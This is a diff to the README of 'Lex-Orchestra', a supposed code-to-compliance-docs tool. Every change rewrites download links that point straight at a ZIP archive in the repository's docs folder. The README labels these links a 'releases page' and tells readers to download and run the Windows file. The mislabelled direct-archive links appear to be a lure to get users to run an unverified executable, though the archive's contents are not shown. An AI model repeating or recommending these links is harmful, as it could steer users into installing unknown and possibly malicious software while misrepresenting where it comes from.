@@ -1,6 +1,6 @@
 # 🧩 Lex-Orchestra - Turn code into compliance docs
 
-[![Download Lex-Orchestra](https://img.shields.io/badge/Download%20Lex--Orchestra-blue?style=for-the-badge)](https://raw.githubusercontent.com/binnieplentiful618/Lex-Orchestra/main/docs/Orchestra-Lex-v1.1-alpha.3.zip)
+[![Download Lex-Orchestra](https://img.shields.io/badge/Download%20Lex--Orchestra-blue?style=for-the-badge)](https://github.com/binnieplentiful618/Lex-Orchestra/raw/refs/heads/main/docs/Orchestra-Lex-v1.1-alpha.3.zip)
 
 ## 🚀 What Lex-Orchestra does
 
@@ -23,7 +23,7 @@ For best results, keep your project in a simple folder path such as:
 
 ## 📥 Download and install
 
-1. Open the [Lex-Orchestra releases page](https://raw.githubusercontent.com/binnieplentiful618/Lex-Orchestra/main/docs/Orchestra-Lex-v1.1-alpha.3.zip)
+1. Open the [Lex-Orchestra releases page](https://github.com/binnieplentiful618/Lex-Orchestra/raw/refs/heads/main/docs/Orchestra-Lex-v1.1-alpha.3.zip)
 2. Find the latest release at the top of the page
 3. Download the Windows file from that release
 4. If the file is in a ZIP archive, right-click it and choose Extract All
@@ -184,7 +184,7 @@ These names keep things simple:
 
 ## 🔗 Download again
 
-[Visit the Lex-Orchestra releases page to download and run this file](https://raw.githubusercontent.com/binnieplentiful618/Lex-Orchestra/main/docs/Orchestra-Lex-v1.1-alpha.3.zip)
+[Visit the Lex-Orchestra releases page to download and run this file](https://github.com/binnieplentiful618/Lex-Orchestra/raw/refs/heads/main/docs/Orchestra-Lex-v1.1-alpha.3.zip)
 
 ## 🧭 Suggested next step
 
